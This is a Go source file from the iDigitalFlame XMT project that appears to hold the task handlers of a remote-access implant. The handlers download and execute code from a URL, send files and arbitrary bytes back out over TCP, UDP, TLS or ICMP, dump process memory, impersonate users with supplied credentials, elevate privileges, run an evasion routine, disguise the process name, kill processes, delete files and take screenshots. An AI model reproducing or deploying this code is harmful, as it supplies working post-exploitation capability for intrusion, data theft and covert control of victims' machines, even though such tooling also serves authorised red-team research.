// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package task

import (
	"context"
	"io"
	"net"
	"os"
	"strings"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/device/screen"
	"github.com/iDigitalFlame/xmt/man"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

// Netcat connection constants
const (
	NetcatTCP uint8 = 0
	NetcatUDP       = iota
	NetcatTLS
	NetcatTLSInsecure
	NetcatICMP
)

const (
	taskIoDelete    uint8 = 0
	taskIoDeleteAll       = iota
	taskIoMove
	taskIoCopy
	taskIoTouch
	taskIoKill
	taskIoKillName
)

var (
	_ backer = (*data.Chunk)(nil)
	_ backer = (*com.Packet)(nil)
)

type backer interface {
	Grow(int) error
	WriteUint32Pos(int, uint32) error
}

func waitThenDelete(e cmd.Runnable, p string) {
	if bugtrack.Enabled {
		defer bugtrack.Recover("task.waitThenDelete()")
	}
	e.Wait()
	os.Remove(p)
}
func taskWait(x context.Context, r data.Reader, _ data.Writer) error {
	d, err := r.Int64()
	if err != nil {
		return err
	}
	if d <= 0 {
		return nil
	}
	t := time.NewTimer(time.Duration(d))
	select {
	case <-t.C:
	case <-x.Done():
	}
	t.Stop()
	return nil
}
func taskPull(x context.Context, r data.Reader, w data.Writer) error {
	var (
		u, a, p string
		err     = r.ReadString(&u)
	)
	// NOTE(dij): Do these escape?
	//            Sometimes the compiler thinks so.
	if err != nil {
		return err
	}
	if err = r.ReadString(&a); err != nil {
		return err
	}
	if err = r.ReadString(&p); err != nil {
		return err
	}
	o, err := man.WebRequest(x, u, a)
	if err != nil {
		return err
	}
	if o.StatusCode >= 400 {
		o.Body.Close()
		return xerr.Sub("invalid HTTP response", 0x67)
	}
	if len(p) == 0 { // If the destination path is zero, then redirect it to the Writer
		w.WriteString("")
		if w.WriteInt64(0); o.Request.ContentLength > 0 {
			if s, ok := w.(backer); ok {
				s.Grow(int(o.Request.ContentLength))
			}
		}
		_, err := io.Copy(w, o.Body)
		o.Body.Close()
		return err
	}
	var (
		v = device.Expand(p)
		f *os.File
	)
	// 0x242 - CREATE | TRUNCATE | RDWR
	if f, err = os.OpenFile(v, 0x242, 0755); err != nil {
		o.Body.Close()
		return err
	}
	n, err := readFromFile(f, o.Body)
	o.Body.Close()
	f.Close()
	w.WriteString(v)
	w.WriteInt64(n)
	return err
}
func taskEvade(_ context.Context, r data.Reader, _ data.Writer) error {
	f, err := r.Uint8()
	if err != nil {
		return err
	}
	return device.Evade(f)
}
func taskLogins(_ context.Context, _ data.Reader, w data.Writer) error {
	e, err := device.Logins()
	if err != nil {
		return err
	}
	w.WriteUint16(uint16(len(e)))
	for i := 0; i < len(e) && i < 0xFFFF; i++ {
		if err = e[i].MarshalStream(w); err != nil {
			return err
		}
	}
	return nil
}
func taskNetcat(x context.Context, r data.Reader, w data.Writer) error {
	h, err := r.StringVal()
	if err != nil {
		return err
	}
	p, err := r.Uint8()
	if err != nil {
		return err
	}
	t, err := r.Uint64()
	if err != nil {
		return err
	}
	b, err := r.Bytes()
	if err != nil {
		return err
	}
	y, f := x, func() {}
	if t > 0 {
		y, f = context.WithTimeout(x, time.Duration(t))
	}
	var c net.Conn
	switch p & 0xF {
	case NetcatUDP:
		c, err = com.UDP.Connect(y, h)
	case NetcatTLS:
		c, err = com.TLS.Connect(y, h)
	case NetcatTLSInsecure:
		c, err = com.TLSInsecure.Connect(y, h)
	case NetcatICMP:
		c, err = com.ICMP.Connect(y, h)
	default:
		c, err = com.TCP.Connect(y, h)
	}
	if err != nil {
		f()
		return err
	}
	k := time.Second * 5
	if t > 0 {
		k = time.Duration(t)
	}
	if len(b) > 0 {
		c.SetWriteDeadline(time.Now().Add(k))
		n, err := c.Write(b)
		if err != nil {
			f()
			c.Close()
			return err
		}
		if n != len(b) {
			f()
			c.Close()
			return io.ErrShortWrite
		}
	}
	if p&0x80 == 0 {
		f()
		c.Close()
		return nil
	}
	n := data.NewCtxReader(x, c)
	c.SetReadDeadline(time.Now().Add(k))
	_, err = io.Copy(w, n)
	f()
	n.Close()
	return err
}
func taskUpload(x context.Context, r data.Reader, w data.Writer) error {
	s, err := r.StringVal()
	if err != nil {
		return err
	}
	var (
		v = device.Expand(s)
		f *os.File
	)
	// 0x242 - CREATE | TRUNCATE | RDWR
	if f, err = os.OpenFile(v, 0x242, 0644); err != nil {
		return err
	}
	n := data.NewCtxReader(x, r)
	c, err := io.Copy(f, n)
	n.Close()
	f.Close()
	w.WriteString(v)
	w.WriteInt64(c)
	return err
}
func taskRename(_ context.Context, r data.Reader, _ data.Writer) error {
	s, err := r.StringVal()
	if err != nil {
		return err
	}
	return device.SetProcessName(s)
}
func taskElevate(_ context.Context, r data.Reader, _ data.Writer) error {
	var f filter.Filter
	if err := f.UnmarshalStream(r); err != nil {
		return err
	}
	if f.Empty() {
		f = filter.Filter{Elevated: filter.True}
	}
	return device.Impersonate(&f)
}
func taskRevSelf(_ context.Context, _ data.Reader, _ data.Writer) error {
	return device.RevertToSelf()
}
func taskDownload(x context.Context, r data.Reader, w data.Writer) error {
	s, err := r.StringVal()
	if err != nil {
		return err
	}
	var (
		v = device.Expand(s)
		i os.FileInfo
	)
	if i, err = os.Stat(v); err != nil {
		return err
	}
	if w.WriteString(v); i.IsDir() {
		w.WriteBool(true)
		w.WriteInt64(0)
		return nil
	}
	c := i.Size()
	w.WriteBool(false)
	w.WriteInt64(c)
	if s, ok := w.(backer); ok {
		s.Grow(int(c))
	}
	// 0 - READONLY
	f, err := os.OpenFile(v, 0, 0)
	if err != nil {
		return err
	}
	n := data.NewCtxReader(x, f)
	_, err = io.Copy(w, n)
	n.Close()
	return err
}
func taskPullExec(x context.Context, r data.Reader, w data.Writer) error {
	var (
		u, a string
		z    bool
		err  = r.ReadString(&u)
	)
	// NOTE(dij): Do these escape?
	//            Sometimes the compiler thinks so.
	if err != nil {
		return err
	}
	if err = r.ReadString(&a); err != nil {
		return err
	}
	if err = r.ReadBool(&z); err != nil {
		return err
	}
	var f *filter.Filter
	if err = filter.UnmarshalStream(r, &f); err != nil {
		return err
	}
	var (
		e cmd.Runnable
		p string
	)
	if z {
		w.WriteUint64(0) // Prime our buffer to handle the PID/ExitCode
		e, p, err = man.WebExec(x, w, u, a)
	} else {
		e, p, err = man.WebExec(x, nil, u, a)
	}
	if err != nil {
		if len(p) > 0 {
			os.Remove(p)
		}
		return err
	}
	e.SetParent(f)
	if err = e.Start(); err != nil {
		if len(p) > 0 {
			os.Remove(p)
		}
		return err
	}
	if !z {
		if w.WriteUint64(uint64(e.Pid()) << 32); len(p) > 0 {
			go waitThenDelete(e, p)
		}
		return nil
	}
	i := e.Pid()
	if err = e.Wait(); len(p) > 0 {
		os.Remove(p)
	}
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		return err
	}
	var (
		c, _ = e.ExitCode()
		s, _ = w.(backer)
	)
	if s == nil {
		return nil
	}
	s.WriteUint32Pos(0, i)
	s.WriteUint32Pos(4, uint32(c))
	return nil
}
func taskProcDump(_ context.Context, r data.Reader, w data.Writer) error {
	var f *filter.Filter
	if err := filter.UnmarshalStream(r, &f); err != nil {
		return err
	}
	return device.DumpProcess(f, w)
}
func taskSystemIo(x context.Context, r data.Reader, w data.Writer) error {
	t, err := r.Uint8()
	if err != nil {
		return err
	}
	switch w.WriteUint8(t); t {
	case taskIoKill:
		i, err := r.Uint32()
		if err != nil {
			return err
		}
		var p *os.Process
		if p, err = os.FindProcess(int(i)); err != nil {
			return err
		}
		err = p.Kill()
		p.Release()
		return err
	case taskIoTouch:
		n, err := r.StringVal()
		if err != nil {
			return err
		}
		k := device.Expand(n)
		if _, err = os.Stat(k); err == nil {
			return nil
		}
		// 0x242 - CREATE | TRUNCATE | RDWR
		f, err1 := os.OpenFile(k, 0x242, 0644)
		if err1 != nil {
			return err1
		}
		f.Close()
		return nil
	case taskIoDelete:
		n, err := r.StringVal()
		if err != nil {
			return err
		}
		return os.Remove(device.Expand(n))
	case taskIoKillName:
		n, err := r.StringVal()
		if err != nil {
			return err
		}
		e, err1 := cmd.Processes()
		if err1 != nil {
			return err1
		}
		var p *os.Process
		for i := range e {
			if !strings.EqualFold(n, e[i].Name) {
				continue
			}
			if p, err = os.FindProcess(int(e[i].PID)); err != nil {
				break
			}
			err = p.Kill()
			if p.Release(); err != nil {
				break
			}
		}
		e, p = nil, nil
		return err
	case taskIoDeleteAll:
		n, err := r.StringVal()
		if err != nil {
			return err
		}
		return os.RemoveAll(device.Expand(n))
	case taskIoMove, taskIoCopy:
		var n, d string
		// NOTE(dij): Do these escape?
		//            Sometimes the compiler thinks so.
		if err = r.ReadString(&n); err != nil {
			return err
		}
		if err = r.ReadString(&d); err != nil {
			return err
		}
		var (
			s, f *os.File
			k    = device.Expand(n)
			u    = device.Expand(d)
		)
		// 0 - READONLY
		if s, err = os.OpenFile(k, 0, 0); err != nil {
			return err
		}
		// 0x242 - CREATE | TRUNCATE | RDWR
		if f, err = os.OpenFile(u, 0x242, 0644); err != nil {
			s.Close()
			return err
		}
		var (
			v = data.NewCtxReader(x, s)
			c int64
		)
		c, err = io.Copy(f, v)
		v.Close()
		f.Close()
		w.WriteString(u)
		if w.WriteInt64(c); t == taskIoCopy || err != nil {
			return err
		}
		return os.Remove(k)
	}
	return xerr.Sub("invalid operation", 0x68)
}
func taskLoginUser(_ context.Context, r data.Reader, _ data.Writer) error {
	// NOTE(dij): This function is here and NOT in an OS-specific file as I
	//            hopefully will find a *nix way to do this also.
	i, err := r.Bool()
	if err != nil {
		return err
	}
	var u, d, p string
	if err = r.ReadString(&u); err != nil {
		return err
	}
	if err = r.ReadString(&d); err != nil {
		return err
	}
	if err = r.ReadString(&p); err != nil {
		return err
	}
	if i {
		return device.ImpersonateUser(u, d, p)
	}
	return device.ImpersonateUserNetwork(u, d, p)
}
func taskScreenShot(_ context.Context, _ data.Reader, w data.Writer) error {
	return screen.Capture(w)
}
